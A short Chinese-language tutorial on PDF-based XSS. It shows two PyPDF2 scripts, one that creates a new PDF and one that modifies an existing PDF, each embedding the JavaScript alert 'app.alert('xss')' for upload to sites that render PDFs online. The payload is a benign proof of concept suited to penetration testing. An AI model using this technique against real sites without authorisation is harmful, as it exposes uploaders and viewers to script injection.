# PDF文件JS弹窗

它的攻击场景其实不算常见，如果有某些站点允许上传PDF、能在线解析PDF并且用户能够在线浏览该PDF文件，就有可能存在PDF XSS攻击。

## 利用python生成恶意文件

### 新建

    from PyPDF2 import PdfReader, PdfWriter
    # 创建一个新的 PDF 文档
    output_pdf = PdfWriter()
    # 添加一个新页面
    page = output_pdf.add_blank_page(width=72, height=72)
    # 添加js代码
    output_pdf.add_js("app.alert('xss');")
    # 将新页面写入到新 PDF 文档中
    with open("xss.pdf", "wb") as f:
        output_pdf.write(f)
        
### 附加到已存在的PDF文件

    from PyPDF2 import PdfReader, PdfWriter
    # 打开原始 PDF 文件
    input_pdf = PdfReader("x.pdf")
    # 创建一个新的 PDF 文档
    output_pdf = PdfWriter()
    # 将现有的 PDF 页面复制到新文档
    for i in range(len(input_pdf.pages)):
        output_pdf.add_page(input_pdf.pages[i])
    # 添加 JavaScript 代码
    output_pdf.add_js("app.alert('xss');")
    # 将新 PDF 文档写入到文件中
    with open("xss.pdf", "wb") as f:
        output_pdf.write(f)
        
